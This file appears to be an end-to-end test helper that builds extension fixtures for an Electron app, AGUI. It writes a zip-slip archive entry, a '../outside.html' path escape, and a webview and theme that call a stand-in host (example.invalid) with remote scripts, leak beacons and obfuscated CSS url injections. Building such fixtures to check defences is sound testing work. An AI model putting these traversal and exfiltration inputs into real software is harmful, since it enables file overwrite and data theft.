import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import process from "node:process";
import {
  corruptShowcaseArchive,
  crashingExtension,
  escapingPathExtension,
  exitingExtension,
  fakeAgent,
  fakeCodexAgent,
  generatedFixturesRoot,
  hangingExtension,
  invalidEngineExtension,
  invalidNamespaceExtension,
  invalidUiSchemaExtension,
  oversizedDirectoryExtension,
  root,
  securityUiExtension,
  showcaseArchive,
  showcaseExtension,
  showcaseUpgradeArchive,
  showcaseUpgradeSource,
  staleSecretV1Extension,
  staleSecretV2Extension,
  unsupportedCodexPlugin,
  workspaceFixtureRoot,
  zipSlipArchive,
} from "./e2e-electron-state.mjs";

export async function ensureBuilt() {
  assert.ok(
    fs.existsSync(path.join(root, "dist", "index.html")),
    "dist/index.html is missing. Run pnpm build:app first.",
  );
  assert.ok(
    fs.existsSync(path.join(root, "dist-electron", "main.js")),
    "dist-electron/main.js is missing. Run pnpm build:app first.",
  );
  assert.ok(fs.existsSync(fakeAgent), "fake ASP agent fixture is missing.");
  assert.ok(fs.existsSync(fakeCodexAgent), "fake Codex app-server fixture is missing.");
  assert.ok(
    fs.existsSync(path.join(showcaseExtension, "package.json")),
    "showcase extension fixture is missing.",
  );
}

export function prepareGeneratedExtensionFixtures() {
  fs.mkdirSync(generatedFixturesRoot, { recursive: true });
  packExtension(showcaseExtension, showcaseArchive);

  fs.cpSync(showcaseExtension, showcaseUpgradeSource, { recursive: true });
  const upgradeManifestPath = path.join(showcaseUpgradeSource, "package.json");
  const upgradeManifest = JSON.parse(fs.readFileSync(upgradeManifestPath, "utf8"));
  upgradeManifest.version = "1.1.0";
  writeJson(upgradeManifestPath, upgradeManifest);
  fs.writeFileSync(
    path.join(showcaseUpgradeSource, "extension.mjs"),
    fs
      .readFileSync(path.join(showcaseUpgradeSource, "extension.mjs"), "utf8")
      .replace('version: "1.0.0"', 'version: "1.1.0"'),
    "utf8",
  );
  packExtension(showcaseUpgradeSource, showcaseUpgradeArchive);

  fs.copyFileSync(showcaseArchive, corruptShowcaseArchive);
  const corrupt = fs.readFileSync(corruptShowcaseArchive);
  const firstNameLength = corrupt.readUInt16LE(26);
  const firstExtraLength = corrupt.readUInt16LE(28);
  const firstDataOffset = 30 + firstNameLength + firstExtraLength;
  corrupt[firstDataOffset] = corrupt[firstDataOffset] ^ 0xff;
  fs.writeFileSync(corruptShowcaseArchive, corrupt);
  writeStoredZip(zipSlipArchive, [{ name: "../escaped.txt", content: "blocked" }]);

  writeExtension(invalidEngineExtension, {
    name: "invalid-engine",
    publisher: "fixture",
    version: "1.0.0",
    engines: { agui: "^99.0.0" },
  });
  writeExtension(
    invalidNamespaceExtension,
    {
      name: "invalid-namespace",
      publisher: "fixture",
      version: "1.0.0",
      engines: { agui: "^0.2.0" },
      contributes: {
        viewsContainers: {
          panel: [{ id: "another.extension.panel", title: "Invalid" }],
        },
        views: {
          "another.extension.panel": [
            {
              id: "another.extension.panel.view",
              name: "Invalid",
              viewType: "web-component",
              entry: "./panel.html",
            },
          ],
        },
      },
    },
    { "panel.html": "<p>invalid</p>" },
  );
  writeExtension(
    invalidUiSchemaExtension,
    {
      name: "invalid-ui-schema",
      publisher: "fixture",
      version: "1.0.0",
      engines: { agui: "^0.2.0" },
      contributes: {
        viewsContainers: {
          panel: [{ id: "fixture.invalid-ui-schema.panel", title: "Invalid UI Schema" }],
        },
        views: {
          "fixture.invalid-ui-schema.panel": [
            {
              id: "fixture.invalid-ui-schema.panel.view",
              name: "Invalid UI Schema",
              viewType: "ui-schema",
              entry: "./panel.json",
            },
          ],
        },
      },
    },
    { "panel.json": '{"type":"Text","text":"invalid"}' },
  );
  writeExtension(escapingPathExtension, {
    name: "escaping-path",
    publisher: "fixture",
    version: "1.0.0",
    engines: { agui: "^0.2.0" },
    contributes: {
      viewsContainers: {
        panel: [{ id: "fixture.escaping-path.panel", title: "Escape" }],
      },
      views: {
        "fixture.escaping-path.panel": [
          {
            id: "fixture.escaping-path.panel.view",
            name: "Escape",
            viewType: "web-component",
            entry: "../outside.html",
          },
        ],
      },
    },
  });
  writeExtension(
    crashingExtension,
    {
      name: "crashing",
      publisher: "fixture",
      version: "1.0.0",
      displayName: "Crashing fixture",
      engines: { agui: "^0.2.0" },
      main: "./extension.mjs",
      activationEvents: ["onCommand:fixture.crashing.fail"],
      permissions: ["commands"],
      contributes: {
        commands: [{ id: "fixture.crashing.fail", title: "Crash during activation" }],
      },
    },
    {
      "extension.mjs":
        "export function activate(){ throw new Error('fixture activation crash'); }\n",
    },
  );
  writeExtension(
    exitingExtension,
    {
      name: "exiting",
      publisher: "fixture",
      version: "1.0.0",
      engines: { agui: "^0.2.0" },
      main: "./extension.mjs",
      activationEvents: ["onCommand:fixture.exiting.exit"],
      permissions: ["commands"],
      contributes: { commands: [{ id: "fixture.exiting.exit", title: "Exit host" }] },
    },
    {
      "extension.mjs":
        "export function activate(context){ context.commands.registerCommand('fixture.exiting.exit', () => process.exit(23)); }\n",
    },
  );
  writeExtension(
    hangingExtension,
    {
      name: "hanging",
      publisher: "fixture",
      version: "1.0.0",
      engines: { agui: "^0.2.0" },
      main: "./extension.mjs",
      activationEvents: ["onCommand:fixture.hanging.echo"],
      permissions: ["commands"],
      contributes: { commands: [{ id: "fixture.hanging.echo", title: "Hanging cleanup" }] },
    },
    {
      "extension.mjs":
        "export function activate(context){ context.commands.registerCommand('fixture.hanging.echo', () => true); } export function deactivate(){ return new Promise(() => {}); }\n",
    },
  );
  const staleSecretExtensionSource =
    "export function activate(context){ context.commands.registerCommand('fixture.stale-secret.read', () => ({ legacy: context.secrets.get('LEGACY_TOKEN') ?? null })); }\n";
  writeExtension(
    staleSecretV1Extension,
    {
      name: "stale-secret",
      publisher: "fixture",
      version: "1.0.0",
      engines: { agui: "^0.2.0" },
      main: "./extension.mjs",
      activationEvents: ["onCommand:fixture.stale-secret.read"],
      permissions: ["commands", "secrets"],
      contributes: {
        commands: [{ id: "fixture.stale-secret.read", title: "Read legacy secret" }],
        configuration: {
          title: "Stale secret fixture",
          properties: {
            LEGACY_TOKEN: { type: "string", secret: true },
          },
        },
      },
    },
    { "extension.mjs": staleSecretExtensionSource },
  );
  writeExtension(
    staleSecretV2Extension,
    {
      name: "stale-secret",
      publisher: "fixture",
      version: "2.0.0",
      engines: { agui: "^0.2.0" },
      main: "./extension.mjs",
      activationEvents: ["onCommand:fixture.stale-secret.read"],
      permissions: ["commands", "secrets"],
      contributes: {
        commands: [{ id: "fixture.stale-secret.read", title: "Read legacy secret" }],
      },
    },
    { "extension.mjs": staleSecretExtensionSource },
  );
  writeExtension(
    securityUiExtension,
    {
      name: "security-ui",
      publisher: "fixture",
      version: "1.0.0",
      displayName: "Security UI fixture",
      engines: { agui: "^0.2.0" },
      permissions: ["ui.detailPanel", "theme", "agent.mcp"],
      contributes: {
        viewsContainers: {
          panel: [{ id: "fixture.security-ui.webview", title: "Security Webview" }],
        },
        views: {
          "fixture.security-ui.webview": [
            {
              id: "fixture.security-ui.webview.view",
              name: "Security Webview",
              viewType: "webview",
              entry: "./webview.html",
            },
          ],
        },
        themes: [
          {
            id: "fixture.security-ui.unsafe-theme",
            label: "Unsafe Security Theme",
            type: "dark",
            path: "./theme.json",
          },
        ],
        mcpServers: "./mcp.json",
      },
    },
    {
      "webview.html":
        "<!doctype html><html><body><h1>Security Webview</h1><script src=\"https://example.invalid/remote.js\"></script><script>fetch('https://example.invalid/leak');new Image().src='https://example.invalid/pixel';</script></body></html>\n",
      "theme.json": JSON.stringify({
        type: "dark",
        colors: {
          accent: "u\\72l(https://example.invalid/theme-leak)",
          canvas: "red;background:url(https://example.invalid/theme-leak)",
          foreground: "#ffffff",
        },
        monaco: { colors: { "editor.background": "fff" } },
      }),
      "mcp.json": JSON.stringify({
        mcpServers: { unsafeCommand: { command: "node", args: ["--version"] } },
      }),
    },
  );
  writeUnsupportedCodexPlugin(unsupportedCodexPlugin, {
    id: "inline-mcp",
    name: "Unsupported Codex Plugin",
    version: "1.0.0",
    description: "Fixture that must not install as an AGUI extension.",
  });
  writeExtension(oversizedDirectoryExtension, {
    name: "oversized-directory",
    publisher: "fixture",
    version: "1.0.0",
    engines: { agui: "^0.2.0" },
  });
  const oversizedPayload = path.join(oversizedDirectoryExtension, "payload.bin");
  fs.writeFileSync(oversizedPayload, "");
  fs.truncateSync(oversizedPayload, 101 * 1024 * 1024);

  const workspaceExtensions = path.join(workspaceFixtureRoot, ".agui", "extensions");
  writeExtension(
    path.join(workspaceExtensions, "trusted"),
    {
      name: "workspace-trusted",
      publisher: "fixture",
      version: "1.0.0",
      displayName: "Trusted workspace fixture",
      engines: { agui: "^0.2.0" },
      main: "./extension.mjs",
      activationEvents: ["onCommand:fixture.workspace-trusted.echo"],
      permissions: ["commands", "agent.skills"],
      capabilities: { untrustedWorkspaces: { supported: false } },
      contributes: {
        commands: [{ id: "fixture.workspace-trusted.echo", title: "Workspace echo" }],
        skills: "./skills",
      },
    },
    {
      "extension.mjs":
        "export function activate(context){ context.commands.registerCommand('fixture.workspace-trusted.echo', () => ({ trusted: true })); }\n",
      "skills/workspace/SKILL.md":
        "---\nname: workspace-fixture\ndescription: Workspace trust test skill.\n---\n\n# Workspace fixture\n",
    },
  );
  writeExtension(
    path.join(workspaceExtensions, "limited"),
    {
      name: "workspace-limited",
      publisher: "fixture",
      version: "1.0.0",
      displayName: "Limited workspace fixture",
      engines: { agui: "^0.2.0" },
      main: "./extension.mjs",
      activationEvents: ["onCommand:fixture.workspace-limited.echo"],
      permissions: ["commands", "ui.detailPanel"],
      capabilities: { untrustedWorkspaces: { supported: "limited" } },
      contributes: {
        commands: [{ id: "fixture.workspace-limited.echo", title: "Limited echo" }],
        viewsContainers: {
          panel: [{ id: "fixture.workspace-limited.panel", title: "Limited static panel" }],
        },
        views: {
          "fixture.workspace-limited.panel": [
            {
              id: "fixture.workspace-limited.panel.view",
              name: "Limited static panel",
              viewType: "webview",
              entry: "./panel.html",
            },
          ],
        },
      },
    },
    {
      "extension.mjs":
        "export function activate(context){ context.commands.registerCommand('fixture.workspace-limited.echo', () => ({ limited: true })); }\n",
      "panel.html": "<p>Static limited workspace UI</p>",
    },
  );
  writeExtension(
    path.join(workspaceExtensions, "mutable"),
    {
      name: "workspace-mutable",
      publisher: "fixture",
      version: "1.0.0",
      engines: { agui: "^0.2.0" },
      main: "./extension.mjs",
      activationEvents: ["onCommand:fixture.workspace-mutable.echo"],
      permissions: ["commands"],
      capabilities: { untrustedWorkspaces: { supported: false } },
      contributes: { commands: [{ id: "fixture.workspace-mutable.echo", title: "Mutable echo" }] },
    },
    {
      "extension.mjs":
        "export function activate(context){ context.commands.registerCommand('fixture.workspace-mutable.echo', () => true); }\n",
    },
  );
}

function packExtension(source, output) {
  execFileSync(
    process.execPath,
    [path.join(root, "scripts", "package-extension.mjs"), source, output],
    { cwd: root, stdio: "inherit" },
  );
}

function writeExtension(directory, manifest, files = {}) {
  fs.mkdirSync(directory, { recursive: true });
  writeJson(path.join(directory, "package.json"), manifest);
  for (const [relative, content] of Object.entries(files)) {
    const destination = path.join(directory, relative);
    fs.mkdirSync(path.dirname(destination), { recursive: true });
    fs.writeFileSync(destination, content, "utf8");
  }
}

function writeUnsupportedCodexPlugin(directory, manifest, files = {}) {
  fs.mkdirSync(directory, { recursive: true });
  writeJson(path.join(directory, ".codex-plugin", "plugin.json"), manifest);
  for (const [relative, content] of Object.entries(files)) {
    const destination = path.join(directory, relative);
    fs.mkdirSync(path.dirname(destination), { recursive: true });
    fs.writeFileSync(destination, content, "utf8");
  }
}

function writeJson(filePath, value) {
  fs.mkdirSync(path.dirname(filePath), { recursive: true });
  fs.writeFileSync(filePath, `${JSON.stringify(value, null, 2)}\n`, "utf8");
}

function writeStoredZip(filePath, entries) {
  const localParts = [];
  const centralParts = [];
  let offset = 0;
  for (const entry of entries) {
    const name = Buffer.from(entry.name, "utf8");
    const content = Buffer.from(entry.content, "utf8");
    const checksum = crc32(content);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0x0800, 6);
    local.writeUInt32LE(checksum, 14);
    local.writeUInt32LE(content.length, 18);
    local.writeUInt32LE(content.length, 22);
    local.writeUInt16LE(name.length, 26);
    localParts.push(local, name, content);

    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0x0800, 8);
    central.writeUInt32LE(checksum, 16);
    central.writeUInt32LE(content.length, 20);
    central.writeUInt32LE(content.length, 24);
    central.writeUInt16LE(name.length, 28);
    central.writeUInt32LE(offset, 42);
    centralParts.push(central, name);
    offset += local.length + name.length + content.length;
  }
  const centralDirectory = Buffer.concat(centralParts);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(entries.length, 8);
  end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(centralDirectory.length, 12);
  end.writeUInt32LE(offset, 16);
  fs.writeFileSync(filePath, Buffer.concat([...localParts, centralDirectory, end]));
}

function crc32(buffer) {
  let crc = 0xffffffff;
  for (const byte of buffer) {
    crc ^= byte;
    for (let bit = 0; bit < 8; bit += 1) crc = (crc >>> 1) ^ (0xedb88320 & -(crc & 1));
  }
  return (crc ^ 0xffffffff) >>> 0;
}
